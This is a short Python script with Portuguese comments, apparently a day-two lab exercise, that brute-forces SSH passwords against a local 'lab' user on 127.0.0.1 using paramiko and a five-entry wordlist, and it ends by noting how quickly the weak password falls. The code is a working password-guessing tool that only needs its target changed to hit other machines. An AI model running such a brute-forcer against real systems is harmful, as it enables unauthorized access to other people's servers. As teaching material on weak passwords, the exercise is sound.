import paramiko # biblioteca que finge ser um cliente SSH
import time

# CONFIGURAÇÃO - SÓ ATACA LOCALHOST
TARGET = "127.0.0.1"  # 127.0.0.1 = seu próprio PC, nunca mude isso pra IP de outro
USER = "lab" # usuário fraco que criamos
WORDLIST = ["123456", "admin", "password", "toor", "toor123"] # senhas vazadas reais

print(f"[DIA 2] Testando {USER}@{TARGET} - apenas LAB LOCAL")

# LOOP DE ATAQUE - testa uma senha por vez
for senha in WORDLIST:
    print(f"Tentando: {senha}...", end=" ")
    try:
        # Cria cliente SSH
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Tenta conectar - é aqui que o Kali verifica a senha
        ssh.connect(TARGET, username=USER, password=senha, timeout=3)
        
        print(f"-> SUCESSO! Senha é {senha}")
        ssh.close() # se acertou, fecha conexão e para
        break
        
    except paramiko.AuthenticationException:
        # Servidor respondeu: senha errada
        print("falhou")
    except Exception as e:
        print(f"erro {e}")
        break
    time.sleep(0.5) # espera 0.5s pra não floodar o servidor

print("\nLição: toor123 caiu em 5 tentativas. Na internet bot testa 24h.")
